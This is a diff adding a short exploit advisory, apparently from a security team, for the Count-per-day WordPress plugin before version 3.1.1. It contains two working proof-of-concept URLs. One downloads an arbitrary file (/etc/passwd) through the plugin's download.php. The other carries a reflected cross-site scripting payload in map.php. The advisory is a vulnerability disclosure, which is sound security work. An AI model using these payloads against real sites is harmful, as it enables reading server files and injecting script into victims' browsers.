@@ -1,0 +1,13 @@
+#Exploit Title: Count-per-day Wordpress plugin Arbitrary file download and XSS
+#Version: < 3.1.1
+#Date: 2011-01-12
+#Author 6Scan (http://6scan.com) security team
+#Software Link: http://wordpress.org/extend/plugins/count-per-day/
+#Official fix: This advisory is released after the vendor has responded and fixed the issue.
+#Description: User could call a remote script to download arbitrary file from the target system. Another script was vulnerable to non-persistent XSS
+
+PoC for File download
+192.168.0.1/wp-content/plugins/count-per-day/download.php?n=1&f=/etc/passwd
+
+PoC for XSS
+192.168.0.1/wp-content/plugins/count-per-day/map/map.php?map='")); </script><img src=http://www.bing.com//az/hprichbg?p=rb%2fOrcaWhales_ROW818916751.jpg>'
